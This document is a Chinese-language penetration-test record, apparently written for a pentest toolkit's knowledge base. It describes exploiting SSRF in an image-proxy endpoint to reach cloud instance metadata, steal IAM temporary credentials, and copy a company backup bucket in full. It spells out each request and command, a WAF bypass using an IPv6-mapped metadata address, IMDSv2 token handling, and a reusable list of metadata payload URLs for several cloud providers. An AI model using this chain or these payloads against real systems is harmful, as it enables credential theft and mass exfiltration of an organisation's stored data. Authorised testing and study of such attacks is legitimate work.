# [2026-02] SSRF → 云元数据 → AK/SK → OSS 全量数据

## 场景分类
Web 渗透 / 云安全

## 目标概述
通过 Web 应用的 SSRF 漏洞访问云元数据服务，获取临时凭据，最终导出 OSS 存储桶全部数据。

## 完整执行链路

1. 发现图片代理接口存在 SSRF
   ```
   GET /api/proxy?url=http://127.0.0.1:8080 → 200 OK（内网端口探测成功）
   ```
2. 尝试访问云元数据
   ```
   GET /api/proxy?url=http://169.254.169.254/latest/meta-data/
   → 返回元数据目录列表
   ```
3. 获取 IAM 角色名
   ```
   GET /api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
   → ECS-Role-WebApp
   ```
4. 获取临时凭据
   ```
   GET /api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ECS-Role-WebApp
   → AccessKeyId, SecretAccessKey, Token
   ```
5. 使用凭据枚举 OSS 桶
   ```bash
   export AWS_ACCESS_KEY_ID=AKIA...
   export AWS_SECRET_ACCESS_KEY=...
   export AWS_SESSION_TOKEN=...
   aws s3 ls  # 或 aliyun oss ls
   ```
6. 发现敏感桶并导出数据
   ```bash
   aws s3 sync s3://company-backup ./backup/
   ```

## 踩坑记录

| 问题 | 原因 | 解决方案 | 耗时 |
|------|------|---------|------|
| SSRF 被 WAF 拦截 169.254 | IP 黑名单 | 用 IPv6 地址 `[::ffff:169.254.169.254]` 绕过 | 15min |
| 临时凭据 1 小时过期 | STS Token 有效期短 | 写脚本自动刷新 Token | 10min |
| 元数据 v2 需要 Token | IMDSv2 防护 | 先 PUT 获取 Token，再带 Token 请求 | 20min |

## 工具链发现
- 阿里云和 AWS 的元数据路径不同，需要分别尝试
- IMDSv2 需要两步请求（PUT 获取 token → GET 带 token）
- 部分云厂商已默认启用 IMDSv2，SSRF 难度增加

## 关键代码/命令

```bash
# IMDSv2 绕过（需要 SSRF 支持自定义 Method 和 Header）
# Step 1: 获取 Token
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

# Step 2: 带 Token 请求
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
X-aws-ec2-metadata-token: <token>
```

## 可复用的模式/脚本片段

```bash
# SSRF 云元数据快速检测 payload 列表
PAYLOADS=(
  "http://169.254.169.254/latest/meta-data/"
  "http://169.254.169.254/metadata/v1/"
  "http://100.100.100.200/latest/meta-data/"
  "http://metadata.google.internal/computeMetadata/v1/"
)
```

## 对本包的改进建议
- routing.md 已有 SSRF/云安全路由 ✓
- 建议在 pentest-tools/references 中补充各云厂商元数据路径对照表

## 进化动作
- [ ] 补充云元数据路径对照表到 references

## 环境信息
- 目标: 阿里云 ECS + OSS
- Web 框架: Spring Boot 2.7
- SSRF 类型: 完全回显型（Full SSRF）
